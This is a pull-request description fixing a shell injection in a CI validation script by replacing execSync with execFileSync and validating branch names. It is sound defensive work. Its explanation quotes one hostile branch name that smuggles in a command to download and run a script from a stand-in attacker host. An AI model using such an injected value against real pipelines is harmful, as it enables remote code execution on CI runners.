# Fix Shell Injection in validate-bundle.mjs (Issue #46207)

## 1. What does this do?
This fixes a severe shell injection vulnerability in `scripts/validate-bundle.mjs`. It replaces the vulnerable `execSync` template-string calls with `execFileSync` and an array of arguments, entirely bypassing shell interpolation. It also introduces defensive branch name validation.

## 2. How is it used?
Because `CONTRIBUTING.md` requires all PRs to live in the `submissions/` folder during the framework freeze, this fix is submitted here for the maintainer to manually apply. 

The maintainer needs to update lines 16-18 in `scripts/validate-bundle.mjs` to the following:

```javascript
    const baseBranch = process.env.GITHUB_BASE_REF || "main";

    // Validate branch name to prevent injection via crafted GITHUB_BASE_REF
    if (!/^[a-zA-Z0-9._\-/]+$/.test(baseBranch)) {
      console.warn(`Invalid branch name "${baseBranch}". Skipping bundle validation.`);
      process.exit(0);
    }

    execFileSync("git", ["fetch", "origin", baseBranch, "--depth=1"], { stdio: "ignore" });
    
    const changedFiles = execFileSync("git", ["diff", "--name-only", `origin/${baseBranch}`], { encoding: "utf8" })
      .split("\n")
      .map(f => f.trim())
      .filter(Boolean);
```
*(Ensure `execFileSync` is imported from `"node:child_process"` at the top of the file).*

## 3. Why is it useful?
It prevents attackers from exploiting the CI/CD pipeline by submitting a pull request with a maliciously crafted branch name (e.g. `main; curl attacker.com/x | sh`) which would previously be executed by the CI runner.
